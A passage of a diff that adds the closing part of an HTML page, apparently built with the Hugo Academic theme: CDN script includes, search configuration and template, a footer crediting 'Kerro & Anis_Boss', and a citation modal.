+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js" integrity="sha256-eOgo0OtLL4cdq7RdwRUiGKLX9XsIJ7nGhWEKbohmVAQ=" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/languages/r.min.js"></script>
+        
+      
+
+    
+
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js" integrity="sha256-EErZamuLefUnbMBQbsEqu1USa+btR2oIlCpBJbyD4/g=" crossorigin="anonymous"></script>
+    
+
+    
+    
+    <script>const code_highlighting = true;</script>
+    
+
+    
+    
+    <script>const isSiteThemeDark = true;</script>
+    
+
+    
+    
+    
+    
+    
+    
+    <script>
+      const search_config = {"indexURI":"/index.json","minLength":1,"threshold":0.3};
+      const i18n = {"no_results":"No results found","placeholder":"Search...","results":"results found"};
+      const content_type = {
+        'post': "Posts",
+        'project': "Projects",
+        'publication' : "Publications",
+        'talk' : "Talks"
+        };
+    </script>
+    
+
+    
+    
+
+    
+    
+    <script id="search-hit-fuse-template" type="text/x-template">
+      <div class="search-hit" id="summary-{{key}}">
+      <div class="search-hit-content">
+        <div class="search-hit-name">
+          <a href="{{relpermalink}}">{{title}}</a>
+          <div class="article-metadata search-hit-type">{{type}}</div>
+          <p class="search-hit-description">{{snippet}}</p>
+        </div>
+      </div>
+      </div>
+    </script>
+    
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+    
+    <script src="/js/academic.min.37431be2d92d7fb0160054761ab79602.js"></script>
+
+    
+
+
+
+
+
+
+  
+  
+  <div class="container">
+    <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    
+
+    Made By Kerro & Anis_Boss with     &#10084;&#65039;
+
+
+    
+    <span class="float-right" aria-hidden="true">
+      <a href="#" class="back-to-top">
+        <span class="button_icon">
+          <i class="fas fa-chevron-up fa-2x"></i>
+        </span>
+      </a>
+    </span>
+    
+  </p>
+</footer>
+
+  </div>
+  
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
